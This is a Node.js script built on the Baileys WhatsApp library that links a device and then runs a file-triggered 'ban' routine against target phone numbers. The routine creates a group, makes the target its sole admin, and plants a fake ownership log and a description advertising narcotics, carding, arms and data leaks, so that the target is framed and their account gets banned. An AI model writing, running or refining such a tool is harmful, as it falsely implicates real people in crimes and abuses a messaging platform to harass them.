const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason,
    Browsers,
    delay
} = require("@whiskeysockets/baileys"); 
const pino = require("pino");
const fs = require("fs");

const sessionPath = './session_new';
let sock = null;
let pairingCodeRequested = false;
let isShuttingDown = false;
let isExecutingBan = false;

function cleanSession() {
    if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
        console.log(`[✓] Cleaned old session`);
    }
}

// ========== BAN COMMAND WATCHER ==========
const BAN_COMMAND_FILE = './ban_command.json';
const BAN_RESULT_FILE = './ban_result.json';

// ========== EXECUTE BAN COMMAND ==========
async function executeBanCommand(targetNumber) {
    if (!sock || isExecutingBan) {
        return { success: false, error: "Socket not ready or busy" };
    }
    
    isExecutingBan = true;
    
    const cleanTarget = targetNumber.replace(/\D/g, '');
    if (cleanTarget.length < 10) {
        isExecutingBan = false;
        return { success: false, error: "Invalid target number format" };
    }
    
    const targetJid = cleanTarget + "@s.whatsapp.net";
    
    // Fix bot JID — remove :XX suffix if present
    let botJid = sock.user.id;
    if (botJid.includes(':')) {
        botJid = botJid.split(':')[0] + '@s.whatsapp.net';
    }
    
    try {
        // Step 1: Create innocent group
        const group = await sock.groupCreate("FRIEND ZONE", []);
        const groupJid = group.id;
        console.log("[✓] Group created: FRIEND ZONE");
        
        await delay(2000);
        
        // Step 2: Add bot and target
        await sock.groupParticipantsUpdate(groupJid, [botJid, targetJid], "add");
        console.log("[✓] Added bot and target");
        await delay(2000);
        
        // Step 3: Promote target to admin
        await sock.groupParticipantsUpdate(groupJid, [targetJid], "promote");
        console.log("[✓] Target promoted to admin");
        await delay(1500);
        
        // Step 4: Demote bot
        await sock.groupParticipantsUpdate(groupJid, [botJid], "demote");
        console.log("[✓] Bot demoted");
        await delay(1500);
        
        // Step 5: Send fake system message making target look like owner
        console.log("[✓] Planting fake ownership message...");
        try {
            await sock.sendMessage(groupJid, {
                text: `📋 GROUP LOG\nOwner: ${targetNumber}\nStatus: Active\nAccess: Full Admin\nCreated: ${new Date().toLocaleString()}`
            });
            await delay(800);
        } catch (e) {
            console.log("[!] Message send failed:", e.message);
        }
        
        // Step 6: Add trap description (names target as owner, added LAST)
        console.log("[✓] Adding trap description...");
        const desc = `👤 OWNER: ${targetNumber}
📅 ACTIVE SINCE: ${new Date().toLocaleDateString()}
📊 STATUS: OPERATIONAL

⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️

💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀

📦 NARCOTICS & CONTROLLED SUBSTANCES
💳 FINANCIAL FRAUD & CARDING  
🔫 RESTRICTED ARMS & BALLISTICS
🔐 DATA LEAKS & CYBER EXPLOITS

⚡ ALL TRADES NON-REFUNDABLE. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT.`;
        
        try {
            await sock.groupUpdateDescription(groupJid, desc);
            console.log("[✓] Trap description added");
        } catch (err) {
            console.log("[!] Description failed:", err.message);
        }
        await delay(800);
        
        // Step 7: Profile picture (added LAST)
        if (fs.existsSync("ghost_ban_profile.jpg")) {
            console.log("[✓] Adding trap profile picture...");
            try {
                const pic = fs.readFileSync("ghost_ban_profile.jpg");
                await sock.updateProfilePicture(groupJid, pic);
            } catch (err) {
                console.log("[!] Profile picture failed:", err.message);
            }
            await delay(800);
        }
        
        // Step 8: Bot leaves immediately — target trapped as sole admin
        console.log("[✓] Bot leaving now...");
        await sock.groupLeave(groupJid);
        console.log("[✓] Bot left. Target is trapped.");
        
        isExecutingBan = false;
        return { success: true, message: "Trap set. Target is sole admin of flagged group." };
        
    } catch (err) {
        isExecutingBan = false;
        return { success: false, error: err.message };
    }
}

// ========== WATCH FOR BAN COMMANDS FROM APP.PY ==========
function watchForBanCommands() {
    setInterval(async () => {
        if (!fs.existsSync(BAN_COMMAND_FILE) || isExecutingBan) return;
        
        try {
            const cmd = JSON.parse(fs.readFileSync(BAN_COMMAND_FILE, 'utf8'));
            if (!cmd.targetNumber) {
                fs.writeFileSync(BAN_RESULT_FILE, JSON.stringify({ success: false, error: "No target number" }));
                fs.unlinkSync(BAN_COMMAND_FILE);
                return;
            }
            
            console.log(`[i] Received ban command for: ${cmd.targetNumber}`);
            const result = await executeBanCommand(cmd.targetNumber);
            fs.writeFileSync(BAN_RESULT_FILE, JSON.stringify(result));
            fs.unlinkSync(BAN_COMMAND_FILE);
            
        } catch (err) {
            console.error("[!] Ban command error:", err.message);
            fs.writeFileSync(BAN_RESULT_FILE, JSON.stringify({ success: false, error: err.message }));
            if (fs.existsSync(BAN_COMMAND_FILE)) fs.unlinkSync(BAN_COMMAND_FILE);
        }
    }, 1000);
}

// ========== CONNECT TO WHATSAPP ==========
async function connectToWhatsApp(isFirstConnect = true) {
    if (isFirstConnect) {
        cleanSession();
    }
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    
    const { version } = await fetchLatestBaileysVersion();
    console.log(`[i] Using WA v${version.join(".")}`);

    sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS("Chrome"),
        syncFullHistory: false,
        markOnlineOnConnect: true,
        printQRInTerminal: false,
        connectTimeoutMs: 120000,
        keepAliveIntervalMs: 30000,
        defaultQueryTimeoutMs: 60000
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (isShuttingDown) return;
        
        if (qr && !pairingCodeRequested && !sock.authState.creds.registered) {
            pairingCodeRequested = true;
            const phoneNumber = process.argv[2]?.replace(/\D/g, '');
            
            if (!phoneNumber || phoneNumber.length < 10) {
                console.error("[x] Error: Provide phone number with country code");
                return;
            }

            console.log(`[i] Requesting pairing code for: ${phoneNumber}`);
            await delay(2000);
            
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                console.log(`ANON_CODE_START:${code}:ANON_CODE_END`);
                fs.writeFileSync('CODE.txt', code);
                console.log("[i] Enter this code on your phone NOW...");
                
            } catch (err) {
                console.error("[✗] Failed to get pairing code:", err.message);
                pairingCodeRequested = false;
            }
        }

        if (connection === "open") {
            console.log("\n[✓] SUCCESS: DEVICE LINKED!");
            console.log(`[i] Device is now ACTIVE and ONLINE`);
            console.log("[i] Press CTRL+C to stop and disconnect\n");
            
            // Start watching for ban commands from app.py
            watchForBanCommands();
            
            // Keep alive
            while (!isShuttingDown) {
                await delay(60000);
                try { 
                    await sock.sendPresenceUpdate('available'); 
                } catch (e) {}
            }
        }

        if (connection === "close") {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            console.log(`[i] Connection closed. Status: ${statusCode}`);

            if (statusCode === 515 || statusCode === DisconnectReason.restartRequired) {
                console.log("[i] 515: Server restart required. Reconnecting...");
                await delay(3000);
                return connectToWhatsApp(false);
            }
            
            if (statusCode === 405) {
                console.log("[!] 405: Not ready. Retrying...");
                await delay(3000);
                pairingCodeRequested = false;
                return connectToWhatsApp(false);
            }
            
            if (statusCode === 408) {
                console.log("[!] 408: Timeout. Retrying...");
                await delay(3000);
                return connectToWhatsApp(false);
            }
            
            if (statusCode === 428) {
                console.log("[!] 428: Closed early. Retrying...");
                await delay(3000);
                pairingCodeRequested = false;
                return connectToWhatsApp(false);
            }
            
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 401;
            
            if (shouldReconnect) {
                console.log("[i] Reconnecting to maintain active status...");
                await delay(3000);
                return connectToWhatsApp(false);
            } else {
                console.log("[✗] Logged out or authentication failed");
                process.exit(1);
            }
        }
        
        if (connection === "connecting") {
            console.log("[i] Connecting to WhatsApp...");
        }
    });

    sock.ev.on("error", (err) => {
        console.error("[!] Socket error:", err.message);
    });
}

// Handle shutdown
process.on("SIGINT", async () => {
    if (isShuttingDown) return;
    isShuttingDown = true;
    console.log("\n[!] Shutting down gracefully...");
    console.log("[✓] Disconnected. Goodbye!");
    process.exit(0);
});

process.on("SIGTERM", () => {
    console.log("\n[!] Terminated");
    process.exit(0);
});

(async () => {
    await connectToWhatsApp(true);
})();

